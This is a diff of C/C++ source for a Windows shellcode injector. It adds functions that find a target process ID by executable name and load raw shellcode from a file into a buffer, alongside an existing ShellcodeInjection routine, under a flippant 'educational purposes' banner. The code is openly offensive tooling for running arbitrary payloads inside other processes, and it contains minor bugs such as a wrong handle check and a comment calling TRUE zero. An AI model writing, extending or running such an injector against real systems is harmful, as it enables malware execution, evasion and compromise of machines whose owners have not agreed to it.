@@ -1,8 +1,107 @@
-#pragma once
-
 #include <stdio.h>
 #include <windows.h>
+#include <TlHelp32.h>
 #include "injection.h"
+
+//-----------------------------------------------------------------------------------------------
+
+unsigned char shellcode[MAX_SHELLCODE_SIZE] = { 0 };
+size_t shellcodeSize = 0;
+
+//-----------------------------------------------------------------------------------------------
+
+#pragma region banner
+
+void banner(void) {
+	printf("\n-----------------------------------------------------------------------------------------------------------------------------\n");
+	printf("\nDISCLAIMER: This code is for educational purposes only... because who doesn't want to learn how to print things, right? \n");
+	printf("If you decide to use this for any malicious activities, well... congratulations, you're officially on the wrong side of history.\n");
+	printf("But seriously, please don't. We don't need any more 'hackers' who think running random scripts makes them a legend. \n\n");
+	printf("\n-----------------------------------------------------------------------------------------------------------------------------\n\n");
+}
+
+#pragma endregion
+
+//-----------------------------------------------------------------------------------------------
+
+#pragma region findPID
+
+/*
+HANDLE CreateToolhelp32Snapshot(
+  [in] DWORD dwFlags,				; TH32CS_SNAPPROCESS because we want to take a snapshot of process
+  [in] DWORD th32ProcessID			; Process Identifier we are going to use '0' to grab all process 
+)
+*/
+DWORD findPID(char* procName) {
+	// Converting char to char_t so we can compare both
+	int len = MultiByteToWideChar(CP_UTF8, 0, procName, -1, NULL, 0);
+	wchar_t* wcharProc = new wchar_t[len];
+	MultiByteToWideChar(CP_UTF8, 0, procName, -1, wcharProc, len);
+
+	// Creating a snapshot of all the process
+	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	if (hSnapShot == NULL) {
+		yapBad("There was an error taking snapshot of all proecss");
+		return NULL;
+	}
+	PROCESSENTRY32 procInfo = {0}; // Structure that will hold the information of the process.
+	procInfo.dwSize = sizeof(PROCESSENTRY32);
+	
+	// Loop to find the process required
+	if (Process32First(hSnapShot, &procInfo)) {
+		for (BOOL nextProc = TRUE; nextProc; nextProc = Process32Next(hSnapShot, &procInfo)) {
+			if (wcscmp(procInfo.szExeFile, wcharProc) == 0) {
+				yapOkay("Found [%ls] process with PID (%d)", wcharProc, procInfo.th32ProcessID);
+				CloseHandle(hSnapShot);
+				delete[] wcharProc;
+				return procInfo.th32ProcessID; // Returning PID
+			}
+		}
+	}
+
+	printf("Process [%ls] was not found", wcharProc);
+	delete[] wcharProc;
+	return NULL;
+}
+
+#pragma endregion
+
+//-----------------------------------------------------------------------------------------------
+
+#pragma region readFromFile
+
+/* This function will save the shellcode and the size of shellcode into variables if executed successfully. The functions returns TURE (0) on successfull execution. Don't expect it to execute successfully tho */
+BOOL LoadShellcodeFromFile(const char* filename) { // size_t is basically a unsigned 64bit integer
+	FILE* pFile;
+	fopen_s(&pFile, filename, "rb");
+	if (pFile == NULL) {
+		yapBad("Failed to open file: %s", filename);
+		return FALSE;
+	}
+
+	/*
+	@breif - Fread is used to read contents of a file pointer and return the size of the file and the save the contents of the file to a pointer to the buffer.
+	@param1 - Pointer to save the contents read from the file
+	@param2 - Size of each element to read
+	@param3 - Max elements it can read
+	@param4 - Pointer to the file
+	*/
+	shellcodeSize = fread(shellcode, 1, MAX_SHELLCODE_SIZE, pFile);
+	if (shellcodeSize == 0) {
+		yapBad("Failed to read shellcode from file or file is empty");
+		fclose(pFile);
+		return FALSE;
+	}
+
+	fclose(pFile);
+	return TRUE;
+}
+
+#pragma endregion 
+
+//-----------------------------------------------------------------------------------------------
+
+#pragma region ShellcodeInjection
 
 /*
 ShellcodeInjection(DWORD PID,		; Process ID
@@ -70,3 +169,5 @@ BOOL ShellcodeInjection(DWORD PID, unsigned char* shellcode, size_t shellcodeSiz
 
 	return TRUE;
 }
+
+#pragma endregion
